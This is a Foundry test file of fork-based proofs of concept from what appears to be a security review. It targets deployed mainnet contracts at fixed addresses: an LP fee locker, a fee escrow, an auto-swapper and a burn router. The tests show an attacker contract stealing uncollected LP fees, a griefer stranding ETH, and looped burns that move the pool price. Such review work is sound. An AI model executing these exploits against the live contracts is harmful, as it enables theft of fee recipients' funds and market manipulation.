// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";

import {ArtCoinsFeeEscrow} from "../../../../src/ArtCoinsFeeEscrow.sol";
import {FeeAutoSwapper} from "../../../../src/FeeAutoSwapper.sol";
import {IFeeAutoSwapper} from "../../../../src/interfaces/IFeeAutoSwapper.sol";
import {ArtCoinsLpLocker} from "../../../../src/lp-lockers/ArtCoinsLpLocker.sol";
import {BurnRouter} from "../../../../src/protocol-fee/BurnRouter.sol";

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {FixedPoint128} from "@uniswap/v4-core/src/libraries/FixedPoint128.sol";
import {FullMath} from "@uniswap/v4-core/src/libraries/FullMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {PoolId, PoolIdLibrary} from "@uniswap/v4-core/src/types/PoolId.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PositionManager} from "@uniswap/v4-periphery/src/PositionManager.sol";
import {PositionInfo} from "@uniswap/v4-periphery/src/libraries/PositionInfoLibrary.sol";

import {BurnFarmer, BurnSandwich} from "./BurnRouterReview.t.sol";
import {LockerFeeThief} from "./LpLockerReview.t.sol";

interface ILiveBurnRouter {
    function processBurnWeth(uint256 minLayerOut) external returns (uint256, uint256);
    function requiredMinLayerOutForCurrentWethBalance() external view returns (uint256);
    function minLayerOutPerWeth() external view returns (uint256);
}

/// fork proofs against the live mainnet contracts (read only fork, pinned block).
/// skipped when no rpc answers.
contract LiveForkReviewTest is Test {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    uint256 internal constant FORK_BLOCK = 26_130_300;
    address internal constant PM = 0x000000000004444c5dc75cB358380D2e3dE08A90;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant LOCKER = 0x866ea3Dc2bf7A3e77374619cf50EB697FA766aab;
    address internal constant ESCROW = 0x7559689765aE86cBB38e68CD1294830CccB125F2;
    address internal constant COIN_111 = 0x61C9d89fe1212F6b55fF888816A151463287B8ae;
    // the 111 locker slot's only recipient (admin 0xdEaD), a FeeAutoSwapper
    address internal constant SWAPPER_111 = 0xeBD9B74A4c26C6E54e83C84CB247c069eC42A961;
    address internal constant LAYER = 0xb7287e4A5b605aB92A8589C62af8A4ebD347E6c9;
    address internal constant LAYER_HOOK = 0xA5eA9904F2cD572c638a1eF81463BDAbEa9D28cc;
    // teamFeeRecipient of factory 0xf051, keeper-reward + owner-floor variant (source not in repo)
    address internal constant LIVE_BURN_ROUTER = 0xE60046ee745B235109C10d322A1cbDB3c029De43;

    bool internal forked;

    function setUp() public {
        string memory rpc = vm.envOr("MAINNET_RPC_URL", string("https://mainnet.gateway.tenderly.co"));
        try vm.createSelectFork(rpc, FORK_BLOCK) {
            forked = true;
        } catch {
            forked = false;
        }
    }

    modifier onlyFork() {
        if (!forked) {
            vm.skip(true);
        }
        _;
    }

    receive() external payable {}

    function _pending111() internal view returns (uint256 f0, uint256 f1) {
        ArtCoinsLpLocker l = ArtCoinsLpLocker(payable(LOCKER));
        PositionManager posm = PositionManager(payable(address(l.positionManager())));
        uint256 first = l.tokenRewards(COIN_111).positionId;
        uint256 n = l.tokenRewards(COIN_111).numPositions;
        for (uint256 i; i < n; i++) {
            (PoolKey memory k, PositionInfo info) = posm.getPoolAndPositionInfo(first + i);
            PoolId id = k.toId();
            int24 lo = info.tickLower();
            int24 hi = info.tickUpper();
            (uint128 liq, uint256 last0, uint256 last1) = IPoolManager(PM).getPositionInfo(
                id, address(posm), lo, hi, bytes32(first + i)
            );
            (uint256 g0, uint256 g1) = IPoolManager(PM).getFeeGrowthInside(id, lo, hi);
            unchecked {
                f0 += FullMath.mulDiv(g0 - last0, liq, FixedPoint128.Q128);
                f1 += FullMath.mulDiv(g1 - last1, liq, FixedPoint128.Q128);
            }
        }
    }

    /// LF-01 on the live 111 stack: real locker, real PositionManager, real pool.
    function test_bug_LF01_fork_live_111_uncollected_fees_stealable() public onlyFork {
        ArtCoinsLpLocker l = ArtCoinsLpLocker(payable(LOCKER));
        ArtCoinsFeeEscrow e = ArtCoinsFeeEscrow(ESCROW);
        (uint256 f0, uint256 f1) = _pending111();
        console2.log("live 111 uncollected eth fees", f0);
        console2.log("live 111 uncollected coin fees", f1);
        assertGt(f0 + f1, 0, "something accrued at fork block");

        uint256 snap = vm.snapshotState();
        uint256 c0 = e.feesToClaim(SWAPPER_111, address(0));
        uint256 c1 = e.feesToClaim(SWAPPER_111, COIN_111);
        l.collectRewards(COIN_111); // keeperRewardBps is 0 on the live locker
        uint256 honest0 = e.feesToClaim(SWAPPER_111, address(0)) - c0;
        uint256 honest1 = e.feesToClaim(SWAPPER_111, COIN_111) - c1;
        vm.revertToState(snap);
        assertEq(honest0, f0, "honest collect == on-chain read (eth)");
        assertEq(honest1, f1, "honest collect == on-chain read (coin)");

        LockerFeeThief thief = new LockerFeeThief(
            IPoolManager(PM), PositionManager(payable(address(l.positionManager()))), l
        );
        thief.attack(l.tokenRewards(COIN_111).poolKey, COIN_111, f0, f1);
        assertEq(address(thief).balance, f0, "thief has the eth fees");
        assertGe(IERC20(COIN_111).balanceOf(address(thief)), f1 * 99 / 100, "thief has the coin fees");
        assertEq(e.feesToClaim(SWAPPER_111, address(0)), c0, "swapper credited nothing");
        assertEq(e.feesToClaim(SWAPPER_111, COIN_111), c1, "swapper credited nothing");
        (uint256 r0, uint256 r1) = _pending111();
        assertEq(r0 + r1, 0);
    }

    /// LF-02 on the live 111 swapper (bytecode at 0xeBD9...).
    function test_bug_LF02_fork_live_111_swapper_eth_strandable() public onlyFork {
        ArtCoinsFeeEscrow e = ArtCoinsFeeEscrow(ESCROW);
        FeeAutoSwapper s = FeeAutoSwapper(payable(SWAPPER_111));
        assertTrue(s.pairedIsNative());
        // real fees: collect the live locker (credits the swapper's eth slot)
        ArtCoinsLpLocker(payable(LOCKER)).collectRewards(COIN_111);
        uint256 credit = e.feesToClaim(SWAPPER_111, address(0));
        if (credit == 0) {
            // no eth side fees at the fork block: deposit as the allowlisted locker
            vm.deal(LOCKER, 1 ether);
            vm.prank(LOCKER);
            e.storeFeesNative{value: 1 ether}(SWAPPER_111);
            credit = 1 ether;
        }
        console2.log("swapper eth credit", credit);
        uint256 before = SWAPPER_111.balance;
        address endRecipient = s.endRecipient();
        uint256 endBefore = endRecipient.balance;

        vm.prank(makeAddr("griefer"));
        e.claim(SWAPPER_111, address(0));

        assertEq(SWAPPER_111.balance - before, credit, "eth now in swapper");
        vm.expectRevert(IFeeAutoSwapper.NothingToFlush.selector);
        s.flushPaired();
        assertEq(endRecipient.balance, endBefore, "end recipient not paid");
    }

    /// LF-03 against src BurnRouter on the live LAYER/WETH pool (real hook).
    function test_bug_LF03_fork_src_burnrouter_loop_on_live_layer_pool() public onlyFork {
        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(LAYER),
            currency1: Currency.wrap(WETH),
            fee: 0x800000,
            tickSpacing: 200,
            hooks: IHooks(LAYER_HOOK)
        });
        BurnRouter br = new BurnRouter(address(this));
        br.initialize(LAYER, WETH, key, PM);
        deal(WETH, address(br), 2 ether);

        uint256 snap = vm.snapshotState();
        (uint256 oneCallIn,) = br.processBurnWeth(0);
        vm.revertToState(snap);

        BurnFarmer f = new BurnFarmer(br);
        (uint160 p0,,,) = IPoolManager(PM).getSlot0(key.toId());
        uint256 burned = f.farm();
        (uint160 p1,,,) = IPoolManager(PM).getSlot0(key.toId());
        uint256 moveBps = (uint256(p1 > p0 ? p1 - p0 : p0 - p1)) * 10_000 / p0;
        console2.log("single call weth in", oneCallIn);
        console2.log("looped calls in one tx", f.calls());
        console2.log("looped weth burned", burned);
        console2.log("sqrtPrice move bps", moveBps);
        console2.log("keeper eth", address(f).balance);
        assertGt(f.calls(), 1, "more than one clamp step in one tx");
        assertGt(burned, oneCallIn, "loop burns past the single call clamp");
        assertGt(moveBps, 50, "price moved beyond one 100 bps (price) step");
    }

    /// LF-09: the live LAYER burn router (0xE600...) has no impact clamp. one call
    /// swaps the whole balance; the only guard is an owner-set LAYER/WETH floor.
    function test_LF09_fork_live_burnrouter_full_balance_owner_floor() public onlyFork {
        ILiveBurnRouter br = ILiveBurnRouter(LIVE_BURN_ROUTER);
        PoolKey memory key = PoolKey({
            currency0: Currency.wrap(LAYER),
            currency1: Currency.wrap(WETH),
            fee: 0x800000,
            tickSpacing: 200,
            hooks: IHooks(LAYER_HOOK)
        });
        (uint160 sp,,,) = IPoolManager(PM).getSlot0(key.toId());
        // LAYER is currency0: LAYER per WETH = 2^192 / sqrtP^2 (both 18 decimals)
        uint256 spotLayerPerWeth = FullMath.mulDiv(FullMath.mulDiv(1e18, 1 << 96, sp), 1 << 96, sp);
        uint256 floor = br.minLayerOutPerWeth();
        console2.log("spot LAYER per WETH (1e18)", spotLayerPerWeth);
        console2.log("owner floor LAYER per WETH (1e18)", floor);
        console2.log("floor as bps of spot", floor * 10_000 / spotLayerPerWeth);

        deal(WETH, LIVE_BURN_ROUTER, 0.5 ether);
        uint256 minOut = br.requiredMinLayerOutForCurrentWethBalance();
        try br.processBurnWeth(minOut) returns (uint256 wethIn, uint256 burned) {
            console2.log("wethIn", wethIn);
            console2.log("layer burned", burned);
            assertGe(wethIn, 0.49 ether, "whole balance in one call, no clamp");
        } catch (bytes memory err) {
            console2.log("processBurnWeth reverted at the owner floor");
            console2.logBytes(err);
        }
    }
}
